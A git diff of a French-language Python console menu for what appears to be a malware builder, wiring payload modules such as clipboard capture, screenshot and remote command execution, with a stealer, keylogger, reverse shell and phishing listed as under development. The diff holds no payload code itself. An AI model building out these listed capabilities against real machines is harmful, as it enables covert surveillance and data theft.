@@ -1,5 +1,33 @@
 from colorama import Fore, Style
 import os 
+from modules.payload.clipboard import clipboard_module
+from modules.payload.screenshot import screenshot_module
+#from modules.payload.dirlist import directory_listing_module
+#from modules.payload.filegrab import file_grabber_module
+#from modules.payload.keybcontrol import keyboard_controller_module
+#from modules.payload.networkinfo import network_info_module
+from modules.payload.openurl import open_url_module
+#from modules.payload.porthammer import port_hammer_module
+#from modules.payload.processview import process_view_module
+#from modules.payload.restart import restart_pc_module
+#from modules.payload.reversehttp import reverse_http_module
+#from modules.payload.reverseshell import reverse_shell_module
+#from modules.payload.rmdir import remove_directory_module
+#from modules.payload.rmscript import remove_file_module
+from modules.payload.runcmd import runcmd_module
+from modules.payload.shutdown import shutdown_module
+#from modules.payload.steal import stealer_module
+#from modules.payload.voicerec import voice_record_module
+#from modules.payload.wallpaper import change_wallpaper_module
+#from modules.payload.wifissid import wifi_ssid_module
+#from modules.capture.phishing import phishing_module
+#from modules.capture.keylogger import keylogger_module
+##from modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
+#from modules.scanner.IPscan import network_scanner_module
+#from modules.scanner.dirscan import directory_scanner_module
+#from modules.scanner.localscan import localhost_scanner_module
+
+
 
 def console():
     def clear():
@@ -19,7 +47,7 @@ A la fin de chaque configuration, le module sera créer dans un fichier prêt à
 Appuyez sur Entrée pour continuer...
           """)
     
-    def help():
+    def show_help():
         clear()
         print(f"""{Fore.CYAN}=== Aide Console Interactive ==={Style.RESET_ALL}
 {Fore.YELLOW}Commandes disponibles :{Style.RESET_ALL}
@@ -34,48 +62,47 @@ Appuyez sur Entrée pour continuer...
     clear()
 
     payloads = [
-        "Clipboard",
-        "Screenshot",
-        "Directory listing",
-        "File Grabber",
-        "keyboard controller",
-        "Network info",
-        "Open url",
-        "Port Hammer",
-        "Procces View",
-        "Restart PC",
-        "Reverse HTTP",
-        "Reverse Shell",
-        "Remove Directory",
-        "Remove file",
-        "Run Command on terminal",
-        "Stealer",
-        "Voice record",
-        "Change wallpaper",
-        "Wifi SSiD"
+        ("Clipboard", clipboard_module),
+        ("Screenshot", screenshot_module),
+        ("Directory listing", None),
+        ("File Grabber", None),
+        ("Keyboard controller", None),
+        ("Network info", None),
+        ("Open url", open_url_module),
+        ("Port Hammer", None),
+        ("Process View", None),
+        ("Restart PC", None),
+        ("Reverse HTTP", None),
+        ("Reverse Shell", None),
+        ("Remove Directory", None),
+        ("Remove file", None),
+        ("Run Command on terminal", runcmd_module),
+        ("Shutdown", shutdown_module),
+        ("Stealer", None),
+        ("Voice record", None),
+        ("Change wallpaper", None),
+        ("Wifi SSiD", None),
     ]
 
     captures = [
-        "phishing",
-        "keylogger",
+        #("phishing", phishing_module),
+        #("keylogger", keylogger_module),
     ]
 
     scanners = [
         "Port Scanner",
         "Vulnerability Scanner",
-        "Network Scanner"
-        "Directrory Scanner"
-        "Localhost Scanner"
+        "Network Scanner",
+        "Directrory Scanner",
+        "Localhost Scanner",
     ]
 
-    import time
-    global tps
     print(Fore.CYAN + "\n=== Console Interactive ===\n")
     print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
     while True:
         cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
         if cmd.lower() == "help":
-            help()
+            show_help()
             clear()
             print(Fore.CYAN + "\n=== Console Interactive ===\n")
             print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants.")
@@ -89,35 +116,41 @@ Appuyez sur Entrée pour continuer...
         1. Clipboard
         2. Screenshot
         3. Directory listing
-        4. File Grabber
-        5. keyboard controller
-        6. Network info
+        4. File Grabber (en développement)
+        5. keyboard controller (en développement)
+        6. Network info (en développement)
         7. Open url
-        8. Port Hammer
-        9. Procces View
-        10. Restart PC
-        11. Reverse HTTP
-        12. Reverse Shell
+        8. Port Hammer (en développement)
+        9. Process View (en développement)  
+        10. Restart PC (en développement)
+        11. Reverse HTTP (en développement)
+        12. Reverse Shell (en développement)
         13. Remove Directory
-        14. Remove file
+        14. Remove file (en développement)
         15. Run Command on terminal
-        16. Stealer
-        17. Voice record
-        18. Change wallpaper
-        19. Wifi SSiD
+        16. Stealer (en développement)
+        17. Voice record (en développement)
+        18. Change wallpaper    (en développement)
+        19. Wifi SSiD (en développement)
 
     """)
             payload_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
             if payload_choix.lower() == "back":
                 clear()
+                print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                 continue
             try:
                 payload_index = int(payload_choix) - 1
                 if 0 <= payload_index < len(payloads):
-                    print(Fore.YELLOW + f"Configuration du payload : {payloads[payload_index]}" + Style.RESET_ALL)
+                    payload_name, payload_func = payloads[payload_index]
+                    print(Fore.YELLOW + f"Configuration du payload : {payload_name}" + Style.RESET_ALL)
+                    if payload_func:
+                        payload_func()  # Appeler le module
+                    else:
+                        print(Fore.RED + "Module non encore implémenté." + Style. RESET_ALL)
                 else:
                     print(Fore.RED + "Numéro de payload invalide." + Style.RESET_ALL)
-            except ValueError:
+            except ValueError: 
                 print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)
 
         elif cmd.lower() == "capture":
@@ -126,13 +159,14 @@ Appuyez sur Entrée pour continuer...
             print(Fore.YELLOW + "Liste des captures disponibles :" + Style.RESET_ALL)
             print("""
                   
-        1. phishing
-        2. keylogger
+        1. phishing (en développement)
+        2. keylogger (en développement)
                   
                   """)
             capture_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
             if capture_choix.lower() == "back":
                 clear()
+                print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                 continue
             try:
                 capture_index = int(capture_choix) - 1
@@ -148,15 +182,16 @@ Appuyez sur Entrée pour continuer...
             print(Fore.CYAN + "=== Modules Scan ===" + Style.RESET_ALL)
             print(Fore.YELLOW + "Liste des scanners disponibles :" + Style.RESET_ALL)
             print("""
-        1. Port Scanner
-        2. Vulnerability Scanner
-        3. Network Scanner
-        4. Directrory Scanner
-        5. Localhost Scanner
+        1. Port Scanner (en développement)
+        2. Vulnerability Scanner (en développement)
+        3. Network Scanner (en développement)
+        4. Directrory Scanner (en développement)
+        5. Localhost Scanner (en développement)
                   """)
             scan_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
             if scan_choix.lower() == "back":
                 clear()
+                print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                 continue
             try:
                 scan_index = int(scan_choix) - 1
@@ -172,11 +207,3 @@ Appuyez sur Entrée pour continuer...
             break
         else:
             print(Fore.RED + "Commande inconnue. Veuillez entrer 'payload', 'capture', 'scan' ou 'exit'." + Style.RESET_ALL)
-
-    
-    
-
-
-
-
-console()
